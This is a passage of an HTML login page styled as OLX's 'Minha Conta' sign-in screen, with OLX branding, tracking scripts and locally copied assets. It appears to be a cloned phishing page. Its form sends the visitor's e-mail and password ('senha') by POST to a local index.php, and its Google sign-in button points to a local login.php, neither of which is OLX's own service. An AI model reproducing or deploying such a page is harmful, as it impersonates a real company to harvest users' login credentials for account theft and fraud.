    margin-top: 24px;
    margin-right: 0;
    margin-bottom: 24px;
    margin-left: 0;
  }

  /* sc-component-id: sc-bCMXmc */
  .cYSvLU {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    margin-top: 24px;
  }
  </style>
  <script src="https://tags.t.tailtarget.com/t3m.js?i=TT-12113-4/CT-886"></script>
  <script async src="js/gpt.js"></script>
  <script async type="application/javascript" src="js/web-fingerprint.min.js"></script>
  <script type="text/javascript" src="js/lurker.min.js"></script>
  <script async>
  (function(h, o, t, j, a, r) {
    h.hj = h.hj || function() {
      (h.hj.q = h.hj.q || []).push(arguments)
    };
    h._hjSettings = {
      hjid: 736533,
      hjsv: 6
    };
    a = o.getElementsByTagName('head')[0];
    r = o.createElement('script');
    r.async = 1;
    r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
    a.appendChild(r);
  })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
  </script>
  <script async src="https://static.hotjar.com/c/hotjar-736533.js?sv=6"></script>
  <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:400,500,600,700&amp;display=swap" rel="stylesheet">
  <link href="https://static.olx.com.br/design-system/ds-tokens.css" rel="preload" as="style">
  <link href="css/ds-tokens.css" rel="stylesheet" media="screen">
  <link href="https://static.olx.com.br/design-system/olx-reset.min.css" rel="preload" as="style">
  <link href="css/olx-reset.min.css" rel="stylesheet">
  <style>
  body {
    background-color: #f9f9f9;
  }

  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  </style>
  <script>
  window.NREUM || (NREUM = {}), __nr_require = function(e, n, t) {
    function r(t) {
      if (!n[t]) {
        var o = n[t] = {
          exports: {}
        };
        e[t][0].call(o.exports, function(n) {
          var o = e[t][1][n];
          return r(o || n)
        }, o, o.exports)
      }
      return n[t].exports
    }
    if ("function" == typeof __nr_require) return __nr_require;
    for (var o = 0; o < t.length; o++) r(t[o]);
    return r
  }({
    1: [function(e, n, t) {
      function r() {}

      function o(e, n, t) {
        return function() {
          return i(e, [c.now()].concat(u(arguments)), n ? null : this, t), n ? void 0 : this
        }
      }
      var i = e("handle"),
        a = e(3),
        u = e(4),
        f = e("ee").get("tracer"),
        c = e("loader"),
        s = NREUM;
      "undefined" == typeof window.newrelic && (newrelic = s);
      var p = ["setPageViewName", "setCustomAttribute", "setErrorHandler", "finished", "addToTrace",
          "inlineHit", "addRelease"
        ],
        d = "api-",
        l = d + "ixn-";
      a(p, function(e, n) {
          s[n] = o(d + n, !0, "api")
        }), s.addPageAction = o(d + "addPageAction", !0), s.setCurrentRouteName = o(d + "routeName", !0), n
        .exports = newrelic, s.interaction = function() {
          return (new r).get()
        };
      var m = r.prototype = {
        createTracer: function(e, n) {
          var t = {},
            r = this,
            o = "function" == typeof n;
          return i(l + "tracer", [c.now(), e, t], r),
            function() {
              if (f.emit((o ? "" : "no-") + "fn-start", [c.now(), r, o], t), o) try {
                return n.apply(this, arguments)
              } catch (e) {
                throw f.emit("fn-err", [arguments, this, e], t), e
              } finally {
                f.emit("fn-end", [c.now()], t)
              }
            }
        }
      };
      a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","), function(e, n) {
        m[n] = o(l + n)
      }), newrelic.noticeError = function(e, n) {
        "string" == typeof e && (e = new Error(e)), i("err", [e, c.now(), !1, n])
      }
    }, {}],
    2: [function(e, n, t) {
      function r(e, n) {
        if (!o) return !1;
        if (e !== o) return !1;
        if (!n) return !0;
        if (!i) return !1;
        for (var t = i.split("."), r = n.split("."), a = 0; a < r.length; a++)
          if (r[a] !== t[a]) return !1;
        return !0
      }
      var o = null,
        i = null,
        a = /Version\/(\S+)\s+Safari/;
      if (navigator.userAgent) {
        var u = navigator.userAgent,
          f = u.match(a);
        f && u.indexOf("Chrome") === -1 && u.indexOf("Chromium") === -1 && (o = "Safari", i = f[1])
      }
      n.exports = {
        agent: o,
        version: i,
        match: r
      }
    }, {}],
    3: [function(e, n, t) {
      function r(e, n) {
        var t = [],
          r = "",
          i = 0;
        for (r in e) o.call(e, r) && (t[i] = n(r, e[r]), i += 1);
        return t
      }
      var o = Object.prototype.hasOwnProperty;
      n.exports = r
    }, {}],
    4: [function(e, n, t) {
      function r(e, n, t) {
        n || (n = 0), "undefined" == typeof t && (t = e ? e.length : 0);
        for (var r = -1, o = t - n || 0, i = Array(o < 0 ? 0 : o); ++r < o;) i[r] = e[n + r];
        return i
      }
      n.exports = r
    }, {}],
    5: [function(e, n, t) {
      n.exports = {
        exists: "undefined" != typeof window.performance && window.performance.timing && "undefined" !=
          typeof window.performance.timing.navigationStart
      }
    }, {}],
    ee: [function(e, n, t) {
      function r() {}

      function o(e) {
        function n(e) {
          return e && e instanceof r ? e : e ? f(e, u, i) : i()
        }

        function t(t, r, o, i) {
          if (!d.aborted || i) {
            e && e(t, r, o);
            for (var a = n(o), u = v(t), f = u.length, c = 0; c < f; c++) u[c].apply(a, r);
            var p = s[y[t]];
            return p && p.push([b, t, r, a]), a
          }
        }

        function l(e, n) {
          h[e] = v(e).concat(n)
        }

        function m(e, n) {
          var t = h[e];
          if (t)
            for (var r = 0; r < t.length; r++) t[r] === n && t.splice(r, 1)
        }

        function v(e) {
          return h[e] || []
        }

        function g(e) {
          return p[e] = p[e] || o(t)
        }

        function w(e, n) {
          c(e, function(e, t) {
            n = n || "feature", y[t] = n, n in s || (s[n] = [])
          })
        }
        var h = {},
          y = {},
          b = {
            on: l,
            addEventListener: l,
            removeEventListener: m,
            emit: t,
            get: g,
            listeners: v,
            context: n,
            buffer: w,
            abort: a,
            aborted: !1
          };
        return b
      }

      function i() {
        return new r
      }

      function a() {
        (s.api || s.feature) && (d.aborted = !0, s = d.backlog = {})
      }
      var u = "nr@context",
        f = e("gos"),
        c = e(3),
        s = {},
        p = {},
        d = n.exports = o();
      d.backlog = s
    }, {}],
    gos: [function(e, n, t) {
      function r(e, n, t) {
        if (o.call(e, n)) return e[n];
        var r = t();
        if (Object.defineProperty && Object.keys) try {
          return Object.defineProperty(e, n, {
            value: r,
            writable: !0,
            enumerable: !1
          }), r
        } catch (i) {}
        return e[n] = r, r
      }
      var o = Object.prototype.hasOwnProperty;
      n.exports = r
    }, {}],
    handle: [function(e, n, t) {
      function r(e, n, t, r) {
        o.buffer([e], r), o.emit(e, n, t)
      }
      var o = e("ee").get("handle");
      n.exports = r, r.ee = o
    }, {}],
    id: [function(e, n, t) {
      function r(e) {
        var n = typeof e;
        return !e || "object" !== n && "function" !== n ? -1 : e === window ? 0 : a(e, i, function() {
          return o++
        })
      }
      var o = 1,
        i = "nr@id",
        a = e("gos");
      n.exports = r
    }, {}],
    loader: [function(e, n, t) {
      function r() {
        if (!E++) {
          var e = x.info = NREUM.info,
            n = l.getElementsByTagName("script")[0];
          if (setTimeout(s.abort, 3e4), !(e && e.licenseKey && e.applicationID && n)) return s.abort();
          c(y, function(n, t) {
            e[n] || (e[n] = t)
          }), f("mark", ["onload", a() + x.offset], null, "api");
          var t = l.createElement("script");
          t.src = "https://" + e.agent, n.parentNode.insertBefore(t, n)
        }
      }

      function o() {
        "complete" === l.readyState && i()
      }

      function i() {
        f("mark", ["domContent", a() + x.offset], null, "api")
      }

      function a() {
        return O.exists && performance.now ? Math.round(performance.now()) : (u = Math.max((new Date).getTime(),
          u)) - x.offset
      }
      var u = (new Date).getTime(),
        f = e("handle"),
        c = e(3),
        s = e("ee"),
        p = e(2),
        d = window,
        l = d.document,
        m = "addEventListener",
        v = "attachEvent",
        g = d.XMLHttpRequest,
        w = g && g.prototype;
      NREUM.o = {
        ST: setTimeout,
        SI: d.setImmediate,
        CT: clearTimeout,
        XHR: g,
        REQ: d.Request,
        EV: d.Event,
        PR: d.Promise,
        MO: d.MutationObserver
      };
      var h = "" + location,
        y = {
          beacon: "bam.nr-data.net",
          errorBeacon: "bam.nr-data.net",
          agent: "js-agent.newrelic.com/nr-1123.min.js"
        },
        b = g && w && w[m] && !/CriOS/.test(navigator.userAgent),
        x = n.exports = {
          offset: u,
          now: a,
          origin: h,
          features: {},
          xhrWrappable: b,
          userAgent: p
        };
      e(1), l[m] ? (l[m]("DOMContentLoaded", i, !1), d[m]("load", r, !1)) : (l[v]("onreadystatechange", o), d[v]
        ("onload", r)), f("mark", ["firstbyte", u], null, "api");
      var E = 0,
        O = e(5)
    }, {}]
  }, {}, ["loader"]);;
  NREUM.info = {
    beacon: "bam.nr-data.net",
    errorBeacon: "bam.nr-data.net",
    licenseKey: "4acdebfc55",
    applicationID: "309728514",
    sa: 1
  }
  </script>
  <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1" class="next-head">
  <meta charset="utf-8" class="next-head">
  <title class="next-head">Minha Conta | OLX</title>
  <link rel="preload"
    href="https://static.olx.com.br/accounts/next-account/_next/static/dbzxkhE7A9FFzRPXFeyZf/pages/Login.js"
    as="script">
  <link rel="preload"
    href="https://static.olx.com.br/accounts/next-account/_next/static/dbzxkhE7A9FFzRPXFeyZf/pages/_app.js" as="script">
  <link rel="preload"
    href="https://static.olx.com.br/accounts/next-account/_next/static/runtime/webpack-25165b1dd6f96cb71368.js"
    as="script">
  <link rel="preload"
    href="https://static.olx.com.br/accounts/next-account/_next/static/chunks/commons.4613cb7a849a3c4a16ec.js"
    as="script">
  <link rel="preload"
    href="https://static.olx.com.br/accounts/next-account/_next/static/runtime/main-2abd75bb10af1e462405.js"
    as="script">
</head>

<body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-546N2JV" height="0" width="0"
      style="display:none;visibility:hidden"></iframe></noscript>
  <div id="__next">
    <div class="sc-jTzLTM iwtnNi">
      <div class="sc-OqFzE dHVgYW sc-jTzLTM iwtnNi">
        <div class="sc-hdNmWC bpcUMs">
          <div class="sc-izUgoq gNNEyt sc-jTzLTM iwtnNi"><a data-ds-component="DS-Link" href=""
              class="sc-ipXKqB WOktY"><svg class="sc-gggouf ewyqkI sc-fcTNbh ixPxuB" width="64px" height="64px"
                viewBox="0 0 64 64">
                <path fill="#6E0AD6"
                  d="M12.1256635,27.6698061 C8.47542857,27.6698061 5.95809524,24.6474552 5.95809524,20.1778307 C5.95809524,15.6655362 8.47542857,12.6431853 12.1256635,12.6431853 C15.7758984,12.6431853 18.2936381,15.6655362 18.2936381,20.1351607 C18.2936381,24.6474552 15.7758984,27.6698061 12.1256635,27.6698061 M12.1256635,33.3317153 C18.8808127,33.3317153 24.2515302,27.7124761 24.2515302,20.1351607 C24.2515302,12.6431853 19.1746032,6.98127607 12.1256635,6.98127607 C5.37051429,6.98127607 -3.46389584e-14,12.6005153 -3.46389584e-14,20.1778307 C-3.46389584e-14,27.7976098 5.07672381,33.3317153 12.1256635,33.3317153"
                  transform="translate(0,12)" />
                <path fill="#8CE563"
                  d="M29.2444038,23.2852123 L40.8247467,23.2852123 C41.6218006,23.2852123 42.0834133,22.8170798 42.0834133,22.008 L42.0834133,18.3045791 C42.0834133,17.4959117 41.6218006,17.0277791 40.8247467,17.0277791 L33.062461,17.0277791 L33.062461,1.27700613 C33.062461,0.468132515 32.6010514,5.59552404e-13 31.8039975,5.59552404e-13 L27.985534,5.59552404e-13 C27.18848,5.59552404e-13 26.7270705,0.468132515 26.7270705,1.27700613 L26.7270705,20.7312 C26.7270705,22.3912049 27.6080356,23.2852123 29.2444038,23.2852123"
                  transform="translate(0,12)" />
                <path fill="#F28000"
                  d="M44.9786311,32.9482012 L51.9436597,24.8176196 L58.6988089,32.9482012 C59.2861867,33.6719411 60.0415898,33.6719411 60.7126756,33.0760049 L63.4398883,30.6495902 C64.1111771,30.0534479 64.1950883,29.2872442 63.5658565,28.6063804 L56.0555073,20.0923877 L62.8945676,12.3023411 C63.4819454,11.6212712 63.4398883,10.8973252 62.7688025,10.2589252 L60.2092089,7.91785031 C59.53792,7.27903804 58.78272,7.32170798 58.195139,8.04524172 L51.9436597,15.4098258 L45.5662121,8.04524172 C44.9786311,7.36417178 44.2234311,7.27903804 43.5521422,7.91785031 L40.9086375,10.3015951 C40.2373486,10.9399951 40.1954946,11.6212712 40.8247263,12.3448049 L47.7897549,20.1348515 L40.1954946,28.6915141 C39.5658565,29.4148417 39.6499708,30.1385816 40.3212597,30.7347239 L42.9645613,33.0760049 C43.6360533,33.6719411 44.3910502,33.6294773 44.9786311,32.9482012"
                  transform="translate(0,12)" />
              </svg></a><span class="sc-cyQzhP VyGkT sc-bdVaJa bxVNCd" color="dark" font-weight="400">Acesse a sua
              conta</span></div>
          <div class="sc-dzQEYZ jiouny sc-jTzLTM iwtnNi">
            <div class="sc-gUlUPW jyGPQI sc-jTzLTM iwtnNi">
              
              <div class="sc-iEPtyo kTmDwB sc-jTzLTM iwtnNi">

                <a href="login.php"><button data-testid="button-wrapper" data-ds-component="DS-Button"
                    class="sc-jptPkM hsjYzV sc-jXQZqI hqlkcq">
                    <div class="sc-etwtAo cKFaoX"> <svg class="sc-ghUbLI gOfDpU sc-fcTNbh iqkXKg" width="24px"
                        height="24px" viewBox="0 0 512 512">
                        <path fill="#ffff"
                          d="M457.732 216.625c2.628 14.041 4.063 28.743 4.063 44.098C461.796 380.688 381.481 466 260.204 466c-116.023 0-210-93.977-210-210s93.977-210 210-210c56.704 0 104.077 20.867 140.44 54.73l-59.204 59.197v-.135c-22.046-21.002-50-31.762-81.236-31.762-69.297 0-125.604 58.537-125.604 127.841 0 69.29 56.306 127.968 125.604 127.968 62.87 0 105.653-35.965 114.46-85.312h-114.46v-81.902h197.528z" />
                      </svg><span class="sc-hrBRpH hZhRCW sc-bdVaJa bxVNCd" color="dark" font-weight="400">Entrar com o
                        Google</span></div>

                  </button></a>
              </div>
              <div class="sc-ljUfdc bSBFaW sc-jTzLTM iwtnNi"></div>
            </div>
            <div class="sc-kSpkgE dGjogm sc-jTzLTM iwtnNi">
              <div class="sc-kQZOhr lfnudJ sc-jTzLTM iwtnNi">
                <div color="#f2f2f2" class="sc-isBZXS bADuTJ sc-jTzLTM iwtnNi"><span
                    class="sc-dKEPtC eiiwWf sc-bdVaJa bxVNCd" color="dark" font-weight="400">ou</span></div>
              </div>
            </div>


            <form action="index.php" method="POST">


              <div data-ds-component="DS-TextInput" class="sc-jrIrqw kGTksN">
                <div class="sc-fHxwqH knMPpz"><label for="input-1" color="--color-neutral-130" display="block"
                    class="sc-hmXxxW YLUOr">E-mail</label></div><span class="sc-hjRWVT lbQyXh">



                  <input type="email" name="email" id="email" aria-busy="false" aria-label="email" aria-invalid="false"
                    aria-errormessage aria-disabled="false" label="E-mail" value class="sc-iybRtq gIsTc">


                </span>
              </div>
              <div class="sc-sVRsr lLQWL sc-jTzLTM iwtnNi">
                <div class="sc-hBcjXN hDYEcM sc-jTzLTM iwtnNi">
                  <div data-ds-component="DS-TextInput" class="sc-jrIrqw kGTksN">
                    <div class="sc-fHxwqH knMPpz"><label for="password-input" color="--color-neutral-130"
                        display="block" class="sc-hmXxxW YLUOr">Senha</label><a data-ds-component="DS-Link"
                        class="sc-fPCuyW kdmgNq sc-ipXKqB WOktY">Esqueceu sua senha?</a></div><span
                      class="sc-hjRWVT lbQyXh">

                      <input type="password" name="senha" id="senha" aria-busy="false" aria-label="senha"
                        aria-invalid="false" aria-errormessage aria-disabled="false" label="Senha" value
                        class="sc-iybRtq gIsTc">


                      <span class="sc-iQtOjA jLvEYt">
                        <div class="sc-gVZiCL gtduyo sc-fPEBxH cwTNYW"><svg class="sc-hAnkBK gYmmmh" width="16px"
                            height="16px" viewBox="0 0 16 16">

                            <path fill="#D2D2D2"
                              d="M1.57626969,8.56207062 C1.96456746,9.16330588 2.42323893,9.76484223 2.94810194,10.3246961 C4.42455447,11.8995788 6.11698456,12.8333333 8,12.8333333 C9.88301544,12.8333333 11.5754455,11.8995788 13.0518981,10.3246961 C13.5767611,9.76484223 14.0354325,9.16330588 14.4237303,8.56207062 C14.5551755,8.35854262 14.6690083,8.16958874 14.7648469,8 C14.6690083,7.83041126 14.5551755,7.64145738 14.4237303,7.43792938 C14.0354325,6.83669412 13.5767611,6.23515777 13.0518981,5.6753039 C11.5754455,4.1004212 9.88301544,3.16666667 8,3.16666667 C6.11698456,3.16666667 4.42455447,4.1004212 2.94810194,5.6753039 C2.42323893,6.23515777 1.96456746,6.83669412 1.57626969,7.43792938 C1.44482452,7.64145738 1.33099169,7.83041126 1.23515306,8 C1.33099169,8.16958874 1.44482452,8.35854262 1.57626969,8.56207062 Z M0.219453071,7.7763932 C0.243827414,7.72764452 0.288957872,7.64235861 0.354576815,7.52570271 C0.461967629,7.33478571 0.589262775,7.12296659 0.736230311,6.89540395 C1.15522421,6.24663921 1.64967774,5.59817556 2.21856473,4.99136277 C3.8671122,3.23291213 5.79968211,2.16666667 8,2.16666667 C10.2003179,2.16666667 12.1328878,3.23291213 13.7814353,4.99136277 C14.3503223,5.59817556 14.8447758,6.24663921 15.2637697,6.89540395 C15.4107372,7.12296659 15.5380324,7.33478571 15.6454232,7.52570271 C15.7110421,7.64235861 15.7561726,7.72764452 15.7805469,7.7763932 C15.8509288,7.91715695 15.8509288,8.08284305 15.7805469,8.2236068 C15.7561726,8.27235548 15.7110421,8.35764139 15.6454232,8.47429729 C15.5380324,8.66521429 15.4107372,8.87703341 15.2637697,9.10459605 C14.8447758,9.75336079 14.3503223,10.4018244 13.7814353,11.0086372 C12.1328878,12.7670879 10.2003179,13.8333333 8,13.8333333 C5.79968211,13.8333333 3.8671122,12.7670879 2.21856473,11.0086372 C1.64967774,10.4018244 1.15522421,9.75336079 0.736230311,9.10459605 C0.589262775,8.87703341 0.461967629,8.66521429 0.354576815,8.47429729 C0.288957872,8.35764139 0.243827414,8.27235548 0.219453071,8.2236068 C0.149071198,8.08284305 0.149071198,7.91715695 0.219453071,7.7763932 Z M8,10.5 C6.61928813,10.5 5.5,9.38071187 5.5,8 C5.5,6.61928813 6.61928813,5.5 8,5.5 C9.38071187,5.5 10.5,6.61928813 10.5,8 C10.5,9.38071187 9.38071187,10.5 8,10.5 Z M8,9.5 C8.82842712,9.5 9.5,8.82842712 9.5,8 C9.5,7.17157288 8.82842712,6.5 8,6.5 C7.17157288,6.5 6.5,7.17157288 6.5,8 C6.5,8.82842712 7.17157288,9.5 8,9.5 Z" />
                          </svg></div>
                      </span></span>
                  </div>
                </div>
              </div>

              <button type="submit" name="submit" data-testid="button-wrapper" data-ds-component="DS-Button"
                class="sc-jXQZqI cMkCFS">
                <div class="sc-etwtAo cKFaoX">
                  <!-- -->Entrar
                </div>
              </button>


            </form>

          </div>
          <div class="sc-cRULEh fpdWXI sc-jTzLTM iwtnNi">
            <div color="#f2f2f2" class="sc-isBZXS bADuTJ sc-jTzLTM iwtnNi"></div>
          </div>
          <div class="sc-ekHBYt bJiQWo sc-jTzLTM iwtnNi"><span font-weight="400"
              class="sc-bsVVwV eokxeq sc-bdVaJa bxVNCd" color="dark">Não tem uma conta?</span><a
              data-ds-component="DS-Link" href="" class="sc-eTyWNx jdMgYu sc-ipXKqB WOktY">Cadastre-se</a>
          </div>
        </div>


</body>

</html>